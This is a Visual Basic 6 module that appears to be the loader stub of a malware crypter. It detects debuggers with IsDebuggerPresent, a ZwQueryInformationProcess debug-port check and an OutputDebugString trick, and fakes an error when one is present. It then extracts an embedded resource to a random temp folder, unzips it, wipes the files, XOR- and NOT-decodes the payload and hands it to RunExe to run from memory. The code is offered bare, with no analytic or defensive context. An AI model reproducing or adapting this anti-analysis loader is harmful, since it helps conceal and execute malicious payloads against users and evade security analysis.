Attribute VB_Name = "mMod"
Private Declare Function IsDebuggerPresent Lib "kernel32.dll" () As Long
Private Declare Function ZwQueryInformationProcess Lib "ntdll" (ByVal ProcessHandle As Long, ByVal ProcessInformationClass As Long, ByRef ProcessInformation As Any, ByVal ProcessInformationLength As Long, ByRef ReturnLength As Long) As Long
Private Declare Sub OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String)

Private Sub Main()
    If IsDebugger = True Then
        MsgBox "This program cannot run under debugger!", vbCritical, "Failed to start program"
    Else
        Call MainRun
    End If
End Sub

Function RandomString(cb As Integer) As String
    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next

End Function

Private Sub MainRun()
Dim i As Long
Dim File() As Byte
Dim ExPath As String
    ExPath = Environ("TMP") & "\" & RandomString(5)
    
    File = LoadResData(102, "CUSTOM")
    MkDir ExPath & "\"
    
    Open ExPath & "\Data.zip" For Binary Access Write As #1
        Put #1, , File
    Close #1
    
    If ShellUnzip(ExPath & "\Data.zip", ExPath & "\") = True Then
        Open ExPath & "\Data.bin" For Binary As #1
        ReDim File(LOF(1))
        Get #1, , File
    Close #1
    Else
        End
    End If
    
    Kill ExPath & "\Data.zip"
    Kill ExPath & "\Data.bin"
    RmDir (ExPath & "\")
    
    For i = 0 To UBound(File)
        File(i) = File(i) Xor &H31
        File(i) = Not File(i)
    Next
        
    Call RunExe(App.Path & "\" & App.EXEName & ".exe", File)
End Sub

Private Function IsDebugger() As Boolean
Dim DebugPort As Long

Call OutputDebugString("%s%s%s%s%s%s%s")

If IsDebuggerPresent Then
    IsDebugger = True
    Exit Function
End If

ZwQueryInformationProcess -1&, 7&, DebugPort, 4, 0&
If DebugPort <> 0 Then
    IsDebugger = True
    Exit Function
End If
IsDebugger = False
End Function

